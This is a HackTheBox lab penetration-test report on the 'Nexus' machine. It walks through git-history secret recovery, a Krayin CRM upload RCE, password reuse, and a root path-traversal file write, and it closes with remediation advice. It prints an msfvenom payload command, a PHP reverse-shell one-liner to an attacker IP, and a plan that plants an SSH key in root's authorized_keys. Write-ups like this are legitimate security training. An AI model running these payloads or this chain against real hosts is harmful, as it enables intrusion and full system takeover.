# Nexus — HackTheBox Penetration Test Report

**Machine:** Nexus · **Platform:** HackTheBox · **OS:** Ubuntu 24.04 LTS (Linux)
**Target:** 10.129.234.54 · **Domain:** nexus.htb · **Author:** Rayan Fakhreddine
**Result:** Full compromise — root shell on the host.

---

## 1. Executive Summary

Nexus is a Linux web server that was fully compromised starting from an unauthenticated position on the network. The path required no memory-corruption exploit; it chained a leaked secret, a known application vulnerability, password reuse, and an insecure internal automation script.

A self-hosted code platform (Gitea) was reachable on a subdomain and exposed a repository whose configuration file had once contained a database password. Although the password had been deleted in a later change, it was still recoverable from the project's **history** — deleting a secret from a file does not delete it from version control. That password opened the admin panel of the site's customer-management application, which was running a version with a **publicly known remote-code-execution flaw**. Exploiting it gave a foothold as the web service account. From there, a database password was reused as a real user's login password, granting an interactive session as that user. Finally, a scheduled maintenance script that ran automatically **as the root administrator** processed attacker-controlled input without validating file paths, which was used to plant an access key and take over the machine entirely.

**Business impact:** an attacker able to reach this server could progress from *no access at all* to *complete administrative control of the host* — and with it every file, credential, and customer record the application stores. Each individual weakness is common and individually unremarkable; chained together they are catastrophic.

Remediation for all five issues is in Section 5.

---

## 2. Findings Overview

| # | Finding | Severity | Affected Component | MITRE ATT&CK |
|---|---------|----------|--------------------|--------------|
| 1 | Root-run automation script vulnerable to path traversal / arbitrary file write | **Critical** | `template-sync.py` (systemd timer) | [T1068](https://attack.mitre.org/techniques/T1068/), [T1053.006](https://attack.mitre.org/techniques/T1053/006/) |
| 2 | Known RCE in Krayin CRM 2.2.0 (CVE-2026-38526) exposed to authenticated users | **Critical** | `billing.nexus.htb` (Krayin CRM) | [T1190](https://attack.mitre.org/techniques/T1190/) |
| 3 | Database password recoverable from Gitea commit history | **High** | `git.nexus.htb` (Gitea repo) | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| 4 | Password reuse between application DB and a system user account | **High** | `jones` system account | [T1078](https://attack.mitre.org/techniques/T1078/) |
| 5 | Exposed development subdomains (Gitea, billing) via virtual-host enumeration | **Medium** | nginx virtual hosts | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) |

---

## 3. Attack Narrative

Described in the order carried out, including the attempts that failed.

### 3.1 Reconnaissance

Learn what is exposed and what kind of host this is.

```bash
nmap -sVC 10.129.234.54
```

Only two ports were open — SSH (22, OpenSSH 9.6p1 / Ubuntu) and HTTP (80, nginx 1.24.0). The web server issued a redirect to `http://nexus.htb/`, which signals name-based virtual hosting: the site expects a hostname, not a bare IP.

```bash
echo "10.129.234.54  nexus.htb" | sudo tee -a /etc/hosts
```

Browsing the site (a fictional "Nexus Energy Authority" careers page) surfaced two email addresses — `careers@nexus.htb` and, as the hiring manager, **`j.matthew@nexus.htb`**. The second is a likely username later.

### 3.2 Virtual-Host Enumeration

Virtual hosting means other sites may share this IP behind different hostnames. Fuzz the `Host` header to find them.

```bash
ffuf -c -u http://nexus.htb/ \
  -H "Host: FUZZ.nexus.htb" \
  -w /usr/share/SecLists/.../DNS/subdomains-top1million-20000.txt \
  -mc 200
```

This revealed additional virtual hosts, notably **`git.nexus.htb`** (a Gitea instance) and **`billing.nexus.htb`**. Added them to `/etc/hosts`.

```
git.nexus.htb      -> Gitea 1.26.0 (self-hosted Git)
billing.nexus.htb  -> Krayin CRM
```

### 3.3 Secret Recovery from Git History

A self-hosted Git server often holds deployment configs and secrets. Enumerate it.

The Gitea `admin` account had one public repository: **`krayin-docker-setup`**, containing a `docker-compose` and a `.env` file.

The current `.env` had its `DB_PASSWORD` blanked — but a file's history is not erased by editing it. Checking the commit that changed the `.env` showed the removed value:

```
# commit diff on .env
-  APP_URL=http://nexus.htb
+  APP_URL=http://billing.nexus.htb
...
-  DB_PASSWORD=N27xh!!2ucY04
+  DB_PASSWORD=
```

Two things fell out at once: the **DB password** (`N27xh!!2ucY04`) and confirmation that the CRM lives at **`billing.nexus.htb`**.

![[git-history-db-password.png]]
Checked the Gitea user `jones` for repositories (`git.nexus.htb/Jones`) — the account existed but had **no repos**. A dead end at this stage, though the username is noted for later.

### 3.4 Authenticated Access to the CRM

Try the recovered password against the hiring manager's email on the CRM admin panel — the leaked account belongs to the billing app.

```
URL:      http://billing.nexus.htb/admin
Email:    j.matthew@nexus.htb
Password: N27xh!!2ucY04
```

Login succeeded. The application identified itself as **Krayin CRM v2.2.0**.

### 3.5 Foothold via CVE-2026-38526 (Krayin CRM RCE)

A specific product version is a lead — check for public vulnerabilities before anything manual.

Krayin CRM 2.2.x carries **CVE-2026-38526**, an authenticated RCE: the admin-side TinyMCE media-upload feature lets a logged-in user upload a server-executable file (PHP) and then trigger it with a normal web request.

Built a PHP payload and used the public PoC from [ExploitDB](https://www.exploit-db.com/exploits/52629) to upload it through the authenticated session:

```bash
# generate the payload
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.16.43 -o payload.php

# upload it via the CRM's authenticated TinyMCE endpoint (ExploitDB PoC)
python rce_exploit.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f payload.php
# [+] File uploaded successfully.
# Path to file: http://billing.nexus.htb/storage/tinymce/<hash>.php
```

Rather than rely on the meterpreter stager, I opened a listener and triggered a stable reverse shell by requesting the uploaded file:

```bash
# on Kali
nc -lvnp 9001

# the payload connects back and spawns an interactive shell:
nohup php -r '$sock=fsockopen("10.10.16.43",9002);exec("/bin/bash -i <&3 >&3 2>&3");' >/dev/null 2>&1 &
```

```bash
curl http://billing.nexus.htb/storage/tinymce/<hash>.php   # triggers execution
```

A shell landed as **`www-data`**.

### 3.6 Database Looting and Lateral Movement

**Intuition.** The app has a live database; dump its users, and look for password reuse against the real accounts on the box.

The application's on-disk `.env` (now readable as `www-data`) held the working DB password:

```bash
cat /var/www/krayin/.env
# DB_USERNAME=krayin
# DB_PASSWORD=y27xb3ha!!74GbR
```

Into the database and the `users` table:
![[Pasted image 20260919181825.png]]
![[Pasted image 20260919181834.png]]
![[Pasted image 20260919181841.png]]

```sql
select * from users;
-- id=1 | james | j.matthew@nexus.htb | $2y$10$ez0AouNyeP4NmwjLSV5vCOAJxMLi.6fCKmGC3M6Ve5xJmWJOLRJ5i
```

Tried to crack the bcrypt hash offline:

```bash
echo '$2y$10$ez0AouNyeP4NmwjLSV5vCOAJxMLi.6fCKmGC3M6Ve5xJmWJOLRJ5i' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
# Hashfile 'hash.txt' on line 1: Separator unmatched  -> did not crack
```

Cracking stalled (and bcrypt is deliberately slow), so I pivoted to **password reuse** instead. `/etc/passwd` showed a human account `jones` (uid 1000, `/bin/bash`). Testing the DB password against it over SSH:

```bash
ssh jones@10.129.234.54
# password: y27xb3ha!!74GbR  -> Welcome to Ubuntu 24.04.4 LTS
```

The application database password had been **reused** as the `jones` system password. Interactive session as `jones`.

```bash
jones@nexus:~$ cat user.txt
e45c885934e824e08c6cce4944cc8ec3
```

**User flag captured.**

![[Pasted image 20260919182005.png]]

### 3.7 Privilege Escalation — Path Traversal in a Root-Run Sync Script

**Intuition.** Look for anything that runs automatically as root. Modern Linux schedules jobs with systemd timers (the replacement for cron), so enumerate those first.

```bash
systemctl list-timers --all
# NEXT ... UNIT
# ... gitea-template-sync.timer   (fires ~every minute)
```

![[Pasted image 20260919182044.png]]

The timer's service ran a Python script **as root**:

![[Pasted image 20260919182126.png]]

The script (readable but not writable by `jones`) syncs Gitea "template" repositories. Its core extracts every file from a template repo and writes it into a staging directory:

```python
def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name  = repo_info['name'].lower()
    stage_path = os.path.join(STAGING_DIR, owner, name)
    ...
    for mode, objhash, filepath in entries:          # entries come from `git ls-tree`
        target = os.path.join(stage_path, filepath)  # <-- filepath is attacker-controlled and unsanitized
        ...
        # git cat-file blob <objhash>  -> written to `target`
```

**The vulnerability.** `filepath` comes straight from the repository tree and is joined onto `stage_path` with no validation. Because a path component can contain `../`, a crafted filename escapes the staging directory. Since the script runs as **root**, this is an arbitrary file write as root.

![[Pasted image 20260919182247.png]]

**The plan.** `stage_path` resolves to `/home/git/template-staging/<owner>/<name>`. From there, four `../` segments reach `/`, then `root/.ssh/authorized_keys`. Writing my own SSH public key into root's `authorized_keys` grants a root login.

Generated a dedicated key pair, then used `jones`'s credentials (reused again) to sign into Gitea, created a repository, and **marked it as a template** so the root script would process it:

```bash
ssh-keygen -f root_key      # produces root_key / root_key.pub
```

Signed into Jone's gitea account and created a new github repo, called `roadtoroot`, and marked it as a template. 

![[Pasted image 20260919182506.png]]

Cloned the empty template repo and added a build step that commits a file whose path traverses to root's `authorized_keys`, with its contents set to `root_key.pub`:

```bash
git clone http://git.nexus.htb/jones/roadtoroot.git   # repo marked as "Template" in Gitea
# build.py: create an entry named ../../../../root/.ssh/authorized_keys
#           containing our public key, then commit & push
python build.py
# Done: <commit hash>
```

![[Pasted image 20260919182626.png]]

Then pushed and synced the updates with the remote branch.

![[Pasted image 20260919182657.png]]

On the next timer tick the root-run script pulled the template, walked its tree, and wrote our key into `/root/.ssh/authorized_keys`. Logging in with the private key:

```bash
ssh -i root_key root@10.129.96.175
root@nexus:~# id
# uid=0(root) gid=0(root) groups=0(root)
root@nexus:~# cat root.txt
a3b6620cfab78a85c8fce341a1cb5d86
```

**Root flag captured — full host compromise.**

![[Pasted image 20260919182714.png]]

> **Note from the raw notes:** the box IP changed (`10.129.234.54` → `10.129.96.175`) partway through because the lab was reset between sessions. Kept here so the two addresses aren't mistaken for a transcription error.

---

## 4. MITRE ATT&CK Mapping

| Phase | Technique | ID |
|-------|-----------|-----|
| Reconnaissance | Active Scanning: Wordlist Scanning (vhost fuzzing) | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) |
| Service discovery | Network Service Discovery | [T1046](https://attack.mitre.org/techniques/T1046/) |
| Secret in Git history | Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| CRM exploitation | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) |
| Web shell | Server Software Component: Web Shell | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) |
| DB looting | Data from Local System / Unsecured Credentials | [T1005](https://attack.mitre.org/techniques/T1005/) |
| Lateral movement | Valid Accounts (password reuse) | [T1078](https://attack.mitre.org/techniques/T1078/) |
| Privilege escalation | Exploitation for Privilege Escalation | [T1068](https://attack.mitre.org/techniques/T1068/) |
| Root persistence | Scheduled Task/Job: Systemd Timers · SSH authorized_keys | [T1053.006](https://attack.mitre.org/techniques/T1053/006/), [T1098.004](https://attack.mitre.org/techniques/T1098/004/) |

---

## 5. Remediation

Ordered by priority; each gives the specific fix and the control class it belongs to.

### Priority 1 — Fix the root-run sync script (Finding 1, Critical)
Validate and canonicalize every path before writing. Reject any tree entry whose resolved path escapes the intended staging directory (e.g. resolve with `os.path.realpath` and assert it starts with `STAGING_DIR`), and reject absolute paths and `..` components outright. Better still, run the sync service under a **dedicated low-privilege account**, not root — no template sync needs uid 0.
*Control class — input validation on untrusted data + least privilege for scheduled jobs.*

### Priority 2 — Patch Krayin CRM (Finding 2, Critical)
Upgrade Krayin CRM past the CVE-2026-38526 fix. Until patched, restrict the TinyMCE upload feature and enforce server-side allow-listing of upload types so executable content (PHP) can never be written to a web-served path.
*Control class — patch management + never serve user-uploaded files from an executable location.*

### Priority 3 — Purge secrets from version control (Finding 3, High)
The DB password is still in the repo history even though it's gone from the current file. **Rotate it immediately** (a leaked secret must be treated as burned), then rewrite history to purge it (`git filter-repo`/BFG) and enable secret-scanning on the Gitea instance to catch the next one at push time.
*Control class — secrets management; deleting a secret from a file does not delete it from history.*

### Priority 4 — Eliminate password reuse (Finding 4, High)
The application database password must never equal a system login password. Rotate the `jones` account password to a unique value, and separate service credentials from interactive user credentials as policy.
*Control class — credential hygiene; unique secrets per account and per purpose.*

### Priority 5 — Reduce dev-surface exposure (Finding 5, Medium)
Gitea and the billing CRM are internal tooling and should not be reachable, unauthenticated, from the internet-facing host. Place them behind VPN/network segmentation or at minimum IP allow-listing, and avoid discoverable virtual-host names.
*Control class — attack-surface reduction; internal services off the public edge.*

### Cross-cutting
File-integrity monitoring on `/root/.ssh/authorized_keys` and alerting on new SSH keys, plus monitoring for new/modified systemd units, would raise the chance of detecting the final step even if the traversal bug persisted.
